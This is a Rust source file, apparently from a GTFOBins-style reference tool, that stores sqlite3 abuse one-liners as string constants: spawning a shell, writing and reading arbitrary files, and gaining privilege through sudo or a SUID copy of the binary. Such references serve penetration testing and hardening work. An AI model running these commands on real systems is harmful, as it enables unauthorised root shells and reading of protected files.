pub static BIN_NAME: &'static str = "sqlite3";
pub static SH_CODE: &'static str = r#"
    
    sqlite3 /dev/null '.shell /bin/sh'
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sqlite3 << EOF
    CREATE TABLE t(line TEXT);
    .import $LFILE t
    SELECT * FROM t;
    EOF
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which sqlite3) .

    LFILE=file_to_read
    sqlite3 << EOF
    CREATE TABLE t(line TEXT);
    .import $LFILE t
    SELECT * FROM t;
    EOF
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo sqlite3 /dev/null '.shell /bin/sh'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which sqlite3) .

    ./sqlite3 /dev/null '.shell /bin/sh'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
